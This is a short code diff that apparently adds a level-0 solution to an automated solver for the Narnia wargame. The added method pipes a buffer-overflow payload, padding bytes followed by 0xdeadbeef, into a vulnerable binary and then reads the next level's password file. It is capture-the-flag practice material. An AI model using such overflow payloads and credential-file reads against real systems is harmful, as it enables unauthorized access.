@@ -22,3 +22,10 @@ class Solver(solver_util.AbstractSolver):
   @property
   def port(self):
     return 2226
+
+  def level0(self, proc):
+    proc.sendline(
+        "cat <(echo $(python -c 'print(20*\"B\"+\"\".join(map(chr, reversed([0xde, 0xad, 0xbe, 0xef]))))') &&"
+        "      sleep 1 && echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0")
+    proc.expect(r'\$ ')
+    return proc.before.splitlines()[6]
